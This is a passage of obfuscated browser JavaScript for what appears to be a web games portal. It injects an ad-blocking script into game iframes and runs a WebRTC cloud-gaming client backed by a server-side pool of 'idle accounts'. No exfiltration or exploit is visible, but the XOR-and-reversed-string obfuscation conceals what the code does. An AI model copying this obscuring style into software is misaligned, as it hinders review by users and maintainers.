    const _0xaacg = `<script>(${_gameAdBlockInit['toString']()})();</script>`;
    _0xggb36f = (573697 ^ 573702) + (483703 ^ 483703);
    if (new RegExp('<head[^>]*>', 'i')['test'](html)) return html['replace'](new RegExp(">)*]>^[(daeh<".split("").reverse().join(""), 'i'), `<head$1>${_0xaacg}`);
    if (new RegExp('<html[^>]*>', 'i')['test'](html)) return html['replace'](new RegExp('<html([^>]*)>', 'i'), `<html$1><head>${_0xaacg}</head>`);
    return _0xaacg + html;
}

function _injectGameAdBlock(iframe) {
    try {
        let _0x7ga5cg;
        const _0xfda7dg = iframe['contentDocument'] || iframe['contentWindow']['document'];
        _0x7ga5cg = 271365 ^ 271361;
        if (!_0xfda7dg) return;
        var _0x7ggc = (747938 ^ 747943) + (955043 ^ 955046);
        const s = _0xfda7dg['createElement']("script");
        _0x7ggc = (192250 ^ 192242) + (878043 ^ 878042);
        s['textContent'] = `(${_gameAdBlockInit['toString']()})();`;
        _0xfda7dg['documentElement']['appendChild'](s);
    } catch (e) {}
}
document['getElementById']("gameFrame")['addEventListener']("load", function() {
    if (_skipNextGameAdBlockInject) {
        _skipNextGameAdBlockInject = false;
        return;
    }
    _injectGameAdBlock(this);
});

function _unwrapModuleContent(html, _0xebfc5b) {
    const _0x9699dd = html['match'](new RegExp(">tnetnoC/\\<*s\\>]\\]\\)?*]S\\s\\[([\\ATADC[\\!<*s\\>*]>^[tnetnoC<".split("").reverse().join(""), 'i'));
    _0xebfc5b = (670191 ^ 670182) + (578287 ^ 578281);
    if (_0x9699dd) return _0x9699dd[981662 ^ 981663];
    if (new RegExp(">eludoM<*s\\^".split("").reverse().join(""), 'i')['test'](html)) {
        let _0x64a0b;
        const _0xcf88be = html['search'](new RegExp('<!doctype html|<html', 'i'));
        _0x64a0b = (922405 ^ 922400) + (150247 ^ 150246);
        if (_0xcf88be !== -(104222 ^ 104223)) return html['slice'](_0xcf88be);
    }
    return html;
}
async function openDirectGame(source, name, url) {
    const {
        "gf": gf,
        'loading': loading,
        "gen": gen
    } = _openGamePlayerShell(`${source}/${name}`);
    try {
        const _0xb9864f = await fetch(url);
        const _0x3fd7ad = _unwrapModuleContent(await _0xb9864f['text']());
        if (gen !== _gamePlayerGen) return;
        gf['onload'] = () => {
            if (gen !== _gamePlayerGen) return;
            loading['style']['display'] = "enon".split("").reverse().join("");
            gf['style']['display'] = "kcolb".split("").reverse().join("");
        };
        const _0x85d7c = gf['contentDocument'];
        _0x85d7c['open']();
        _skipNextGameAdBlockInject = !![];
        _0x85d7c['write'](_ADBLOCKIT(_withBaseHref(_0x3fd7ad, _dirOf(url))));
        _0x85d7c['close']();
    } catch (e) {
        if (gen === _gamePlayerGen) loading['textContent'] = "daol ot deliaf".split("").reverse().join("");
    }
}
async function openGamePlayer(gameId) {
    const {
        'gf': gf,
        "loading": loading,
        "gen": gen
    } = _openGamePlayerShell(gameId);
    try {
        await _initLumin();
        const {
            'url': url
        } = await Lumin['getGameUrl'](gameId);
        const _0xfdd33f = await fetch(url);
        var _0xd41d3d = (948093 ^ 948091) + (634878 ^ 634872);
        const _0x58ad = await _0xfdd33f['text']();
        _0xd41d3d = 268825 ^ 268826;
        if (gen !== _gamePlayerGen) return;
        gf['onload'] = () => {
            if (gen !== _gamePlayerGen) return;
            loading['style']['display'] = "none";
            gf['style']['display'] = "kcolb".split("").reverse().join("");
        };
        var _0x22e47d = (188997 ^ 188994) + (370768 ^ 370772);
        const _0xac_0xe80 = gf['contentDocument'];
        _0x22e47d = (903090 ^ 903088) + (313743 ^ 313743);
        _0xac_0xe80['open']();
        _skipNextGameAdBlockInject = !![];
        _0xac_0xe80['write'](_ADBLOCKIT(_withBaseHref(_0x58ad, _dirOf(url))));
        _0xac_0xe80['close']();
    } catch (e) {
        if (gen === _gamePlayerGen) loading['textContent'] = "daol ot deliaf".split("").reverse().join("");
    }
}

function closeGamePlayer() {
    resetGameCloseConfirm();
    _cloudEndedActive = false;
    var _0x72b66d = (861014 ^ 861008) + (425288 ^ 425289);
    const _0x8f129b = document['getElementById']("gamePlayer");
    _0x72b66d = 'chjbhd';
    const _0x25_0xe3e = document['getElementById']("emarFemag".split("").reverse().join(""));
    const _0xbebb = document['getElementById']("cloudVideoWrap");
    const _0x59624e = document['getElementById']("gamePlayerLoading");
    _0x8f129b['classList']['remove']("nepo".split("").reverse().join(""));
    _0x25_0xe3e['src'] = "about:blank";
    _0x25_0xe3e['style']['display'] = "none";
    _0xbebb['style']['display'] = "enon".split("").reverse().join("");
    _0x59624e['style']['display'] = "flex";
    _0x59624e['textContent'] = "loading…";
    document['getElementById']("dIreyalPemag".split("").reverse().join(""))['textContent'] = '';
    document['getElementById']("gamePlayerTimeLeft")['textContent'] = '';
    try {
        Lumin['endGame']();
    } catch (e) {}
    if (_cloudEnabled && !_cloudSession) {
        _gamesState['matches'] = _filterByName(_cloudGames, _gamesKeyword);
        _updateGamesCount();
        _gamesVirt['setItems'](_gamesState['matches']);
    }
}

function _exitStaleFullscreen(expectedTarget) {
    if (document['fullscreenElement'] && document['fullscreenElement'] !== expectedTarget) {
        document['exitFullscreen']()['catch'](() => {});
    }
}

function toggleGameFullscreen() {
    const _0x877da = _cloudSession ? document['getElementById']("cloudVideoWrap") : document['getElementById']("gamePlayer");
    if (!document['fullscreenElement']) _0x877da['requestFullscreen']();
    else document['exitFullscreen']();
}

function _lockCloudKeyboard() {
    try {
        navigator['keyboard']?.lock?.();
    } catch {}
}

function _unlockCloudKeyboard() {
    try {
        navigator['keyboard']?.unlock?.();
    } catch {}
}
document['addEventListener']("fullscreenchange", function _gfsFc() {
    var _0xbaeg = (641804 ^ 641803) + (526828 ^ 526829);
    const _0x3c97f = document['getElementById']("nocIsFreyalPemag".split("").reverse().join(""));
    _0xbaeg = (817754 ^ 817759) + (815341 ^ 815339);
    if (_0x3c97f) {
        _0x3c97f['innerHTML'] = document['fullscreenElement'] ? ">/\"3h2-2 1 0 0 2 2a3-v12 61M3v2 2 1 0 0 2 2a3h61 3M3V2-2-1 0 0 2 2a3-h8 12M3H2 2-1 0 0 2 2a3v3 8M\"=d htap<".split("").reverse().join("") : ">/\"3-v2-2 0 0 0 2 2a3h12 61M3h2 2 0 0 0 2 2a3v61 3M3-h2-2-0 0 0 2 2a5V8 12M3v2 2-0 0 0 2 2a5H3 8M\"=d htap<".split("").reverse().join("");
    }
    if (_cloudSession) {
        if (document['fullscreenElement']) _lockCloudKeyboard();
        else _unlockCloudKeyboard();
    }
}, !![]);
document['getElementById']("gamesSearch")['addEventListener']("tupni".split("").reverse().join(""), function() {
    clearTimeout(_gamesSearchTimer);
    var _0x3696ac = (382786 ^ 382791) + (297599 ^ 297591);
    const _0x7e6a = this['value']['trim']();
    _0x3696ac = (110858 ^ 110863) + (753588 ^ 753585);
    _gamesSearchTimer = setTimeout(() => _gamesReload(_0x7e6a || null), 422131 ^ 422317);
});
var _0x1a_0x121 = (899422 ^ 899416) + (184824 ^ 184825);
let _cloudEnabled = false;
_0x1a_0x121 = 881032 ^ 881032;
let _0xag13d;
let _cloudGames = [];
_0xag13d = (690032 ^ 690039) + (553679 ^ 553678);
let _cloudSession = null;
var _0xdb39df = (987255 ^ 987255) + (333018 ^ 333019);
let _cloudPc = null;
_0xdb39df = (892451 ^ 892452) + (807403 ^ 807403);
let _cloudDc = null;
var _0x9_0x15e = (544200 ^ 544205) + (332518 ^ 332515);
let _cloudWs = null;
_0x9_0x15e = (401911 ^ 401919) + (210047 ^ 210043);
var _0x8b1df = (470887 ^ 470886) + (527150 ^ 527146);
let _cloudTimers = [];
_0x8b1df = (535417 ^ 535417) + (927018 ^ 927022);
let _0x6968cf;
let _cloudInputActive = false;
_0x6968cf = (614755 ^ 614757) + (764266 ^ 764269);
var _0x51fb7e = (783188 ^ 783191) + (933790 ^ 933785);
let _cloudInputHandlers = null;
_0x51fb7e = (401646 ^ 401640) + (623956 ^ 623959);
let _cloudStarting = false;
let _0xbd4eeb;
let _cloudJitterHandlers = null;
_0xbd4eeb = (686065 ^ 686066) + (851634 ^ 851633);
let _cloudEndedActive = false;
let _0xc72e;
let _cloudPendingCandidates = [];
_0xc72e = (249762 ^ 249760) + (468298 ^ 468297);

function getStratusBase(_0x6d3f, _0x99g85d) {
    _0x6d3f = 455377 ^ 455379;
    if (window['devMode']) {
        _0x99g85d = window['serverList']?.[770063 ^ 770063] || "moc.lobtufsrepiv.ndc".split("").reverse().join("");
    } else if (window['wispServer']?.includes("://")) {
        _0x99g85d = window['wispServer']['split']("//:".split("").reverse().join(""))[759880 ^ 759881]['split']("/")[775377 ^ 775377];
    } else {
        _0x99g85d = "moc.lobtufsrepiv.ndc".split("").reverse().join("");
    }
    if (_0x99g85d['includes']("//:".split("").reverse().join(""))) return _0x99g85d['replace']("/iw/".split("").reverse().join(""), "sutarts/".split("").reverse().join(""));
    return `https://${_0x99g85d}/stratus`;
}
async function stratusApi(path, method = "GET", body, _0xa_0x55d) {
    const _0x44c3aa = getStratusBase();
    _0xa_0x55d = (875497 ^ 875503) + (655409 ^ 655409);
    var _0x3ge60e = (843588 ^ 843590) + (666229 ^ 666230);
    const _0x23b3cc = await fetch(`${_0x44c3aa}/${path}`, {
        'method': method,
        'headers': body ? {
            'content-type': 'application/json'
        } : undefined,
        'body': body ? JSON['stringify'](body) : undefined
    });
    _0x3ge60e = 532603 ^ 532602;
    const _0x54bc = await _0x23b3cc['json']()['catch'](() => ({}));
    if (!_0x23b3cc['ok'] && !_0x54bc['error']) _0x54bc['error'] = `HTTP ${_0x23b3cc['status']}`;
    return _0x54bc;
}

function setCloudPhase(name, detail, spin) {
    document['getElementById']("esahPduolc".split("").reverse().join(""))['textContent'] = name;
    document['getElementById']("liateDesahPduolc".split("").reverse().join(""))['textContent'] = detail || '';
    document['getElementById']("cloudSpinner")['style']['display'] = spin ? "block" : "none";
}

function _quitCloudSession(uuid) {
    if (!uuid) return;
    fetch(`${getStratusBase()}/session/${uuid}/quit`, {
        "method": "POST",
        'keepalive': !![]
    })['catch'](() => {});
}

function teardownCloud(quit) {
    if (quit && _cloudSession) _quitCloudSession(_cloudSession['uuid']);
    _cloudInputActive = false;
    _cloudStarting = false;
    _unlockCloudKeyboard();
    if (_cloudInputHandlers) {
        const {
            'mouseMoveHandler': mouseMoveHandler,
            "mouseButtonHandler": mouseButtonHandler,
            'contextMenuHandler': contextMenuHandler,
            'wheelHandler': wheelHandler,
            'videoClickHandler': videoClickHandler,
            'keyDownHandler': keyDownHandler,
            "keyUpHandler": keyUpHandler,
            'video': video,
            "pointerLockChangeHandler": pointerLockChangeHandler,
            'relockHint': relockHint,
            'invalidateRect': invalidateRect
        } = _cloudInputHandlers;
        document['removeEventListener']("mousemove", mouseMoveHandler);
        document['removeEventListener']("mousedown", mouseButtonHandler);
        document['removeEventListener']("mouseup", mouseButtonHandler);
        document['removeEventListener']("unemtxetnoc".split("").reverse().join(""), contextMenuHandler);
        document['removeEventListener']("wheel", wheelHandler);
        video['removeEventListener']("kcilc".split("").reverse().join(""), videoClickHandler);
        document['removeEventListener']("keydown", keyDownHandler, !![]);
        document['removeEventListener']("puyek".split("").reverse().join(""), keyUpHandler, !![]);
        document['removeEventListener']("egnahckcolretniop".split("").reverse().join(""), pointerLockChangeHandler);
        window['removeEventListener']("resize", invalidateRect);
        relockHint['removeEventListener']("click", videoClickHandler);
        relockHint['style']['display'] = "none";
        _cloudInputHandlers = null;
    }
    if (_cloudJitterHandlers) {
        const {
            'video': video,
            "bumpJitterTarget": bumpJitterTarget
        } = _cloudJitterHandlers;
        video['removeEventListener']("gnitiaw".split("").reverse().join(""), bumpJitterTarget);
        video['removeEventListener']("stalled", bumpJitterTarget);
        _cloudJitterHandlers = null;
    }
    _cloudTimers['forEach'](t => {
        clearInterval(t);
        clearTimeout(t);
    });
    _cloudTimers = [];
    try {
        _cloudDc && _cloudDc['close']();
    } catch {}
    try {
        _cloudPc && _cloudPc['close']();
    } catch {}
    try {
        _cloudWs && _cloudWs['close']();
    } catch {}
    _cloudDc = null;
    _cloudPc = null;
    _cloudWs = null;
    _cloudSession = null;
    _cloudPendingCandidates = [];
    document['exitPointerLock']?.();
    var _0x19c8gc = (566904 ^ 566904) + (203780 ^ 203783);
    const _0x30e = document['getElementById']("oediVduolc".split("").reverse().join(""));
    _0x19c8gc = (639467 ^ 639471) + (709210 ^ 709209);
    if (_0x30e) _0x30e['srcObject'] = null;
}
let _cloudGamesFetchPromise = null;
async function loadCloudGames(_0xc8483c) {
    const _0xcdd8d = await _loadGamesCacheEntry("cloudGames", Array['isArray']);
    _0xc8483c = (266880 ^ 266881) + (445290 ^ 445288);
    if (_0xcdd8d) return _0xcdd8d;
    if (!_cloudGamesFetchPromise) {
        _cloudGamesFetchPromise = (async () => {
            var _0x9883f = (590889 ^ 590893) + (652343 ^ 652336);
            const r = await stratusApi("games");
            _0x9883f = (937304 ^ 937306) + (634651 ^ 634642);
            if (r['error']) throw new Error(r['error']);
            const _0x26_0x178 = (r['games'] || [])['map'](g => ({
                "source": 'cloud',
                "name": g['name'],
                "key": g['key'],
                'cover': g['cover'] || g['image'],
                "displayName": g['name'],
                '_norm': _normalizeGameName(g['name'])
            }));
            await _saveGamesCacheEntry("semaGduolc".split("").reverse().join(""), _0x26_0x178);
            return _0x26_0x178;
        })();
        _cloudGamesFetchPromise['catch'](() => {
            _cloudGamesFetchPromise = null;
        });
    }
    return _cloudGamesFetchPromise;
}

function toggleCloudGames() {
    _cloudEnabled = !_cloudEnabled;
    document['getElementById']("elggoTduolc".split("").reverse().join(""))['classList']['toggle']("on", _cloudEnabled);
    _gamesReload(_gamesKeyword);
}
document['getElementById']("elggoTduolc".split("").reverse().join(""))['addEventListener']("click", toggleCloudGames);
async function startCloudGame(gameKey, gameName, _0xgdb) {
    if (_cloudStarting) return;
    _cloudStarting = !![];
    resetGameCloseConfirm();
    teardownCloud(!![]);
    _gamePlayerGen++;
    const _0x2c_0x86e = document['getElementById']("reyalPemag".split("").reverse().join(""));
    const _0xga_0xg89 = document['getElementById']("emarFemag".split("").reverse().join(""));
    const _0x6db = document['getElementById']("parWoediVduolc".split("").reverse().join(""));
    var _0x7b5b2d = (276251 ^ 276253) + (520401 ^ 520400);
    const _0xe786d = document['getElementById']("oediVduolc".split("").reverse().join(""));
    _0x7b5b2d = 'hphkbb';
    const _0x24d = document['getElementById']("yalrevOduolc".split("").reverse().join(""));
    const _0x4ec94c = document['getElementById']("gnidaoLreyalPemag".split("").reverse().join(""));
    _0xgdb = 361136 ^ 361139;
    const _0x2709ad = document['getElementById']("gamePlayerId");
    _0x2709ad['textContent'] = `cloud/${gameName}`;
    document['getElementById']("tfeLemiTreyalPemag".split("").reverse().join(""))['textContent'] = '';
    _exitStaleFullscreen(_0x6db);
    _0xga_0xg89['style']['display'] = "enon".split("").reverse().join("");
    _0xga_0xg89['src'] = "knalb:tuoba".split("").reverse().join("");
    _0x4ec94c['style']['display'] = "none";
    _0x6db['style']['display'] = "flex";
    _0xe786d['srcObject'] = null;
    _0xe786d['muted'] = !![];
    _0x24d['style']['display'] = "xelf".split("").reverse().join("");
    _0x2c_0x86e['classList']['add']("nepo".split("").reverse().join(""));
    try {
        var _0xcg63ec = (461739 ^ 461742) + (176871 ^ 176870);
        const _0xf49a8b = await stratusApi("sutats".split("").reverse().join(""));
        _0xcg63ec = "jjdpbg".split("").reverse().join("");
        let _0xfa14f;
        const _0x359f = _0xf49a8b['pool']?.idle || 444649 ^ 444649;
        _0xfa14f = (530093 ^ 530093) + (828327 ^ 828322);
        setCloudPhase("requesting game", `${_0x359f} idle accounts`, !![]);
        const s = await stratusApi("noisses".split("").reverse().join(""), "POST", {
            "game_key": gameKey
        });
        if (s['error']) throw new Error(s['error']);
        _cloudSession = {
            'uuid': s['uuid'],
            'state': s['state'],
            'gameKey': gameKey,
            'deadlineAt': null
        };
        if (s['state'] === "deueuq".split("").reverse().join("")) {
            setCloudPhase("deueuq".split("").reverse().join(""), `position #${s['queue_pos']??"?"}`, false);
            while (_cloudSession && _cloudSession['uuid'] === s['uuid']) {
                await new Promise(r => _cloudTimers['push'](setTimeout(r, 231247 ^ 229535)));
                if (!_cloudSession || _cloudSession['uuid'] !== s['uuid']) break;
                const _0x25bfg = await stratusApi(`session/${_cloudSession['uuid']}`);
                if (_0x25bfg['error']) throw new Error(_0x25bfg['error']);
                if (_0x25bfg['state'] === "finished_queue") break;
                setCloudPhase("queued", `position #${_0x25bfg['queue_pos']??"?"}`, false);
            }
            if (!_cloudSession || _cloudSession['uuid'] !== s['uuid']) return;
        }
        setCloudPhase("starting", "booting instance", !![]);
        const _0x33g8de = await stratusApi(`session/${_cloudSession['uuid']}/start`, "TSOP".split("").reverse().join(""), {});
        if (_0x33g8de['error']) throw new Error(_0x33g8de['error']);
        _cloudSession['deadlineAt'] = Date['now']() + _0x33g8de['max_seconds'] * (956804 ^ 957036);
        _cloudSession['signalingWs'] = _0x33g8de['signaling_ws'];
        _cloudSession['iceServers'] = _0x33g8de['ice_servers'];
        await connectCloudSignaling(_0x33g8de['signaling_ws'], _0x33g8de['ice_servers']);
        var _0xeb_0xcga = (998560 ^ 998568) + (547313 ^ 547316);
        const _0x8eec7g = setInterval(() => {
            if (!_cloudSession || !_cloudSession['deadlineAt']) return;
            var _0xbba46a = (953254 ^ 953248) + (707904 ^ 707910);
            const _0xe5_0x5da = Math['max'](416930 ^ 416930, Math['round']((_cloudSession['deadlineAt'] - Date['now']()) / (160869 ^ 161677)));
            _0xbba46a = 159969 ^ 159971;
            document['getElementById']("gamePlayerTimeLeft")['textContent'] = `${Math['floor'](_0xe5_0x5da/(277877^277833))}:${String(_0xe5_0x5da%(248113^248077))['padStart'](466934^466932,"0")}`;
        }, 577738 ^ 577854);
        _0xeb_0xcga = 'dhgnbb';
        _cloudTimers['push'](_0x8eec7g);
    } catch (e) {
        if (_cloudSession) _quitCloudSession(_cloudSession['uuid']);
        _cloudSession = null;
        setCloudPhase("error", e['message'], false);
        _cloudStarting = false;
    }
}
let _0xb5af;
const SOCKET_RECONNECT_DELAY_MS = 423459 ^ 422387;
_0xb5af = "jgnejb".split("").reverse().join("");
var _0xg4d6ea = (307180 ^ 307182) + (275747 ^ 275746);
const SOCKET_RECONNECT_MAX_TRIES = 258521 ^ 258523;
_0xg4d6ea = "fbakip".split("").reverse().join("");

function connectCloudSignaling(signalingWs, iceServers, isReconnect) {
    return new Promise((resolve, reject) => {
        const _0x5e8c = signalingWs['split']("/")['pop']();
        var _0xd8c = (292586 ^ 292587) + (177218 ^ 177218);
        const _0x0e553d = getStratusBase();
        _0xd8c = (691797 ^ 691799) + (668017 ^ 668024);
        const _0x2a_0xf4b = new URL(_0x0e553d);
        const _0x8ff5fe = (_0x2a_0xf4b['protocol'] === "https:" ? "wss://" : "//:sw".split("").reverse().join("")) + _0x2a_0xf4b['host'] + _0x2a_0xf4b['pathname']['replace'](new RegExp("$/\\".split("").reverse().join(""), ""), '') + "/langis/".split("").reverse().join("") + _0x5e8c;
        var _0x9d_0x2c4 = (279456 ^ 279460) + (198397 ^ 198396);
        const _0xbf2fdf = new WebSocket(_0x8ff5fe);
        _0x9d_0x2c4 = (868597 ^ 868594) + (345398 ^ 345396);
        _cloudWs = _0xbf2fdf;
        _0xbf2fdf['onopen'] = () => {
            if (_cloudWs !== _0xbf2fdf) return;
            if (!isReconnect) setCloudPhase("starting", "ecnatsni rof gnitiaw ,detcennoc langis".split("").reverse().join(""), !![]);
            _flushPendingCandidates();
        };
        _0xbf2fdf['onerror'] = () => {
            if (_cloudWs === _0xbf2fdf && !isReconnect) reject(new Error("signaling failed"));
        };
        _0xbf2fdf['onclose'] = () => {
            if (_cloudWs !== _0xbf2fdf) return;
            _cloudWs = null;
            if (_cloudSession && _cloudPc) attemptCloudReconnect();
            else if (!isReconnect) reject(new Error("signaling closed"));
        };
        _0xbf2fdf['onmessage'] = async ev => {
            if (_cloudWs !== _0xbf2fdf) return;
            let m;
            try {
                m = JSON['parse'](ev['data']);
            } catch {
                return;
            }
            switch (m['type']) {
                case "game_ready":
                    if (!_cloudPc) {
                        setCloudPhase("gnitcennoc".split("").reverse().join(""), "negotiating webrtc", !![]);
                        await createCloudPeer(iceServers);
                    }
                    resolve();
                    break;
                case "rewsna_ctr".split("").reverse().join(""):
                    try {
                        await _cloudPc['setRemoteDescription'](new RTCSessionDescription(m['sdp']));
                    } catch {}
                    break;
                case "rtc_candidate":
                    try {
                        await _cloudPc['addIceCandidate'](new RTCIceCandidate(m['candidate']));
                    } catch {}
                    break;
                case "ping":
                    if (_0xbf2fdf['readyState'] === (370307 ^ 370306)) _0xbf2fdf['send'](JSON['stringify']({
                        'type': "ping"
                    }));
                    break;
                case "time_left":
                    if (_cloudSession && typeof m['time_left'] === "rebmun".split("").reverse().join("")) {
                        _cloudSession['deadlineAt'] = Date['now']() + m['time_left'] * (524627 ^ 524987);
                    }
                    break;
                case "game_cap":
                    showCloudEndedScreen("pu si emit".split("").reverse().join(""), m['message']);
                    break;
                case "dedne_emag".split("").reverse().join(""):
                    showCloudEndedScreen("dedne noisses".split("").reverse().join(""), m['message']);
                    break;
            }
        };
    });
}

function attemptCloudReconnect(_0x0a687d) {
    const _0xdc_0x676 = _cloudSession;
    if (!_0xdc_0x676 || _0xdc_0x676['reconnecting']) return;
    _0xdc_0x676['reconnecting'] = !![];
    _0xdc_0x676['reconnectTries'] = 615999 ^ 615999;
    let _0x28_0xb7c = false;
    document['getElementById']("cloudOverlay")['style']['display'] = "flex";
    const _0xddcaf = document['getElementById']("tniHkcoleRduolc".split("").reverse().join(""));
    if (_0xddcaf) _0xddcaf['style']['display'] = "none";
    setCloudPhase("gnitcennocer".split("").reverse().join(""), "…gniyrter ,tsol langis".split("").reverse().join(""), !![]);
    const _0xa27e5e = () => {
        if (!_cloudSession || _cloudSession !== _0xdc_0x676 || _0x28_0xb7c) return;
        _0xdc_0x676['reconnectTries']++;
        connectCloudSignaling(_0xdc_0x676['signalingWs'], _0xdc_0x676['iceServers'], !![])['then'](() => {
            if (_0x28_0xb7c || !_cloudSession || _cloudSession !== _0xdc_0x676) return;
            _0x28_0xb7c = !![];
            _0xdc_0x676['reconnecting'] = false;
            if (_cloudPc && _cloudPc['connectionState'] === "connected") {
                document['getElementById']("cloudOverlay")['style']['display'] = "none";
            } else {
                setCloudPhase("connecting", "…maerts gnirotser ,detcennocer".split("").reverse().join(""), !![]);
            }
        })['catch'](() => {});
        const _0x2c37f = setTimeout(() => {
            if (_0x28_0xb7c || !_cloudSession || _cloudSession !== _0xdc_0x676) return;
            if (_0xdc_0x676['reconnectTries'] >= SOCKET_RECONNECT_MAX_TRIES) {
                _0x28_0xb7c = !![];
                showCloudEndedScreen("dedne noisses".split("").reverse().join(""), "revres emag eht ot noitcennoc tsol".split("").reverse().join(""));
                return;
            }
            try {
                _cloudWs && _cloudWs['close']();
            } catch {}
            _cloudWs = null;
            _0xa27e5e();
        }, SOCKET_RECONNECT_DELAY_MS);
        _cloudTimers['push'](_0x2c37f);
    };
    _0x0a687d = (502047 ^ 502047) + (558966 ^ 558963);
    _0xa27e5e();
}

function showCloudEndedScreen(title, detail) {
    if (!_cloudSession) return;
    teardownCloud(!![]);
    _cloudEndedActive = !![];
    const _0x637feb = document['getElementById']("parWoediVduolc".split("").reverse().join(""));
    const _0x9fed = document['getElementById']("cloudOverlay");
    _0x637feb['style']['display'] = "flex";
    _0x9fed['style']['display'] = "flex";
    setCloudPhase(title, detail || '', false);
}

function cloudSigSend(obj) {
    if (_cloudWs && _cloudWs['readyState'] === (930000 ^ 930001)) {
        _cloudWs['send'](JSON['stringify'](obj));
    } else if (obj['type'] === "rtc_candidate") {
        _cloudPendingCandidates['push'](obj);
    }
}

function _flushPendingCandidates() {
    if (!_cloudPendingCandidates['length']) return;
    var _0xd_0xa2c = (151962 ^ 151954) + (186227 ^ 186226);
    const _0xcbfe = _cloudPendingCandidates;
    _0xd_0xa2c = (363525 ^ 363520) + (239571 ^ 239578);
    _cloudPendingCandidates = [];
    _0xcbfe['forEach'](obj => cloudSigSend(obj));
}
async function createCloudPeer(iceServers, _0x46e, _0x10_0xe9c, _0x2461f, _0x1e82d, _0x72ae, _0xeac62g, _0x31c6b, _0x52444e, _0x5118df, _0x8ffd1f) {
    const _0x2caf2c = document['getElementById']("cloudVideo");
    _0x46e = 859486 ^ 859485;
    _cloudPc = new RTCPeerConnection({
        'iceServers': iceServers,
        'bundlePolicy': "max-bundle",
        "rtcpMuxPolicy": "require",
        "iceCandidatePoolSize": 4
    });
    _cloudPc['addTransceiver']("audio", {
        "direction": 'recvonly'
    });
    const _0x9d36e = _cloudPc['addTransceiver']("oediv".split("").reverse().join(""), {
        "direction": "recvonly"
    });
    try {
        const _0xg3de = RTCRtpReceiver['getCapabilities']?.("video");
        if (_0xg3de?.codecs?.length && _0x9d36e['setCodecPreferences']) {
            const _0xg5b2d = _0xg3de['codecs']['filter'](c => new RegExp('h264', 'i')['test'](c['mimeType']));
            let _0xebcb3c;
            const _0x6bc7e = _0xg3de['codecs']['filter'](c => new RegExp("1va".split("").reverse().join(""), 'i')['test'](c['mimeType']));
            _0xebcb3c = (549651 ^ 549652) + (435746 ^ 435751);
            const _0xggf00c = _0xg3de['codecs']['filter'](c => !new RegExp('h264|av1', 'i')['test'](c['mimeType']));
            var _0xea_0x7cf = (140662 ^ 140657) + (334351 ^ 334342);
            let _0x928bd = false;
            _0xea_0x7cf = (217777 ^ 217783) + (371353 ^ 371352);
            try {
                if (_0x6bc7e['length'] && navigator['mediaCapabilities']?.decodingInfo) {
                    var _0xb56cb = (415615 ^ 415613) + (631550 ^ 631548);
                    const _0xb383a = await navigator['mediaCapabilities']['decodingInfo']({
                        'type': "webrtc",
                        'video': {
                            'contentType': 'video/AV1',
                            'width': 1920,
                            "height": 1080,
                            "bitrate": 4000000,
                            'framerate': 30
                        }
                    });
                    _0xb56cb = 700529 ^ 700535;
                    _0x928bd = !!(_0xb383a['powerEfficient'] && _0xb383a['smooth']);
                }
            } catch {}
            _0x9d36e['setCodecPreferences'](_0x928bd ? [..._0x6bc7e, ..._0xg5b2d, ..._0xggf00c] : [..._0xg5b2d, ..._0x6bc7e, ..._0xggf00c]);
        }
    } catch {}
    _cloudDc = _cloudPc['createDataChannel']("KDSYJ".split("").reverse().join(""), {
        'id': 1,
        "ordered": false,
        "maxRetransmits": 0,
        "priority": "high"
    });
    _cloudDc['onopen'] = () => {};
    const _0x8f2 = _cloudPc;
    const _0xb4ca = _cloudDc;
    _0x10_0xe9c = 'hbcpee';
    _0xb4ca['onclose'] = () => {
        if (_cloudDc !== _0xb4ca || !_cloudSession) return;
        showCloudEndedScreen("session ended", "lost the input channel");
    };
    _0xb4ca['onerror'] = () => {
        if (_cloudDc !== _0xb4ca || !_cloudSession) return;
        showCloudEndedScreen("session ended", "input channel error");
    };
    var _0x9198b = (425896 ^ 425903) + (847494 ^ 847489);
    _0x2461f = 132117 ^ 132117;
    _0x9198b = (170768 ^ 170777) + (711770 ^ 711763);
    var _0x11_0x30c = (134903 ^ 134899) + (822618 ^ 822620);
    _0x1e82d = 467207 ^ 467407;
    _0x11_0x30c = 238162 ^ 238163;
    _0x72ae = 140076 ^ 140036;
    let _0x7285bf = _0x2461f;
    _0xeac62g = 275342 ^ 275334;
    let _0xbe_0x94f = null;
    _0x31c6b = 'cobjoj';
    let _0xa116c = null;
    _0x52444e = (427260 ^ 427262) + (284066 ^ 284070);
    var _0x1a27db = (892029 ^ 892029) + (470272 ^ 470278);
    let _0x954c = null;
    _0x1a27db = 'donofj';
    const _0xed9dc = () => {
        for (const _0x72c19g of [_0xbe_0x94f, _0xa116c]) {
            if (!_0x72c19g) continue;
            try {
                if ("jitterBufferTarget" in _0x72c19g) _0x72c19g['jitterBufferTarget'] = _0x7285bf;
            } catch {}
            try {
                if ("playoutDelayHint" in _0x72c19g) _0x72c19g['playoutDelayHint'] = _0x7285bf / (465565 ^ 465269);
            } catch {}
        }
    };
    const _0xa831b = () => {
        if (_0x954c) {
            clearTimeout(_0x954c);
            _0x954c = null;
        }
        _0x7285bf = Math['min'](_0x1e82d, _0x7285bf + _0x72ae);
        _0xed9dc();
        _0x954c = setTimeout(() => {
            _0x7285bf = Math['max'](_0x2461f, _0x7285bf - _0x72ae);
            _0xed9dc();
        }, 977823 ^ 971015);
        _cloudTimers['push'](_0x954c);
    };
    _0x5118df = (523264 ^ 523267) + (120002 ^ 120004);
    _0x2caf2c['addEventListener']("waiting", _0xa831b);
    _0x2caf2c['addEventListener']("dellats".split("").reverse().join(""), _0xa831b);
    let _0xedg2f = null;
    var _0x1f_0xb25 = (793066 ^ 793064) + (750796 ^ 750799);
    let _0xe1ffaf = null;
    _0x1f_0xb25 = (676910 ^ 676905) + (304353 ^ 304361);
    var _0x22bac = (900184 ^ 900177) + (474642 ^ 474650);
    const _0xd2_0x0eg = setInterval(async () => {
        if (!_cloudPc || _cloudPc !== _0x8f2) return;
        let _0x7491eb;
        try {
            _0x7491eb = await _0x8f2['getStats']();
        } catch {
            return;
        }
        let _0xb9edc = null,
            _0x9bd9e = null,
            _0xfcac = null,
            _0xfed02b = null;
        _0x7491eb['forEach'](s => {
            if (s['type'] === "riap-etadidnac".split("").reverse().join("") && s['state'] === "dedeeccus".split("").reverse().join("") && typeof s['currentRoundTripTime'] === "number") {
                _0xb9edc = s['currentRoundTripTime'] * (565203 ^ 564283);
            }
            if (s['type'] === "inbound-rtp" && s['kind'] === "video") {
                if (typeof s['jitter'] === "number") _0x9bd9e = s['jitter'] * (154438 ^ 153774);
                if (typeof s['packetsLost'] === "number") _0xfcac = s['packetsLost'];
